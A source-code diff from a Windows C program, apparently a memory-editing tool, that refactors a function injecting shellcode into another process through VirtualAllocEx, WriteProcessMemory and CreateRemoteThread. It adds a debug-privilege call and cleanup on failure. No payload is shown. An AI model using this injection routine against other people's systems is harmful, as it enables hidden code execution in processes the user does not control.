@@ -82,19 +82,26 @@ int WriteMemory(DWORD addr, DWORD size, void* writebuff)
 	return result;
 }
 
-int InjectShellcode(HANDLE hProcess, BYTE shellcode[])
+int InjectShellcode(BYTE shellcode[])
 {
+	EnableDebugPriv();
 	LPVOID calladdr = VirtualAllocEx(hProcess, NULL, 1024, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
 	if (!calladdr)
 	{
 		printf("[!]VirtualAllocEx fail\n");
 		return FALSE;
 	}
-	WriteProcessMemory(hProcess, calladdr, shellcode, 1024, NULL);
+	if (!WriteProcessMemory(hProcess, calladdr, shellcode, 1024, NULL))
+	{
+		printf("[!]write shellcode in target process fail\n");
+		VirtualFreeEx(hProcess, calladdr, NULL, MEM_RELEASE);
+		return FALSE;
+	}
 	HANDLE hRemote = CreateRemoteThread(hProcess, NULL, NULL, (DWORD(_stdcall*)(LPVOID))calladdr, NULL, NULL, NULL);
 	if (!hRemote)
 	{
 		printf("[!]create remote thread fail\n");
+		VirtualFreeEx(hProcess, calladdr, NULL, MEM_RELEASE);
 		return FALSE;
 	}
 	WaitForSingleObject(hRemote, INFINITE);
